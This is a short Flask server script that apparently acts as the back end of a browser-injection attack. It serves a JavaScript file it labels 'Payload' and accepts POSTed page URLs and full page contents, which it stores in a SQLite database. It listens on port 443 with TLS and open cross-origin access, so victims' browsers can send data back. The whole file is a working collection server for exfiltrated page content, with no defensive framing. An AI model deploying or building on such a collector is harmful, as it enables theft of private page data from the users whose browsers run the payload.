from flask import Flask, request, send_file
from db import create_connection, insert_content, create_db
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
database = r"sqlite.db"

@app.route('/content', methods=['POST'])
def content():
    conn = create_connection(database)
    url = request.form["url"]
    content = request.form["content"]
    insert_content(conn, (url, content))
    conn.commit()
    print("[+] Received Page: %s" % url,)
    return ""



@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./client.js', attachment_filename='client.js')

app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
